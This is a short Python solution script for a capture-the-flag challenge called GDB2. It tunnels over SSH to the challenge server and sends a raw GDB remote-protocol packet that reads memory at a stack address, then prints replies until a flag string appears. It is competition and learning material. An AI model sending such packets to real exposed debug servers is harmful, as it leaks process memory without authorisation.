#!/usr/bin/env python3
"""
Solution to GDB2
by Javantea
June 9, 2019

Based on gdb2_solution1.txt
by Javantea
Jan 19, 2019

ssh -L4009:challenges:9013 javantea@ctf.neg9.net

"""
import socket
data = b'$m7fffffffd5f2,8#03'
host = 'localhost'
port = 4009

sock = socket.socket()
sock.connect((host, port))
sock.send(data)
flag = b'#'
while flag != b'':
    flag = sock.recv(1024)
    print(flag)
    if b'f149{' in flag and b'}' in flag: break
#loop
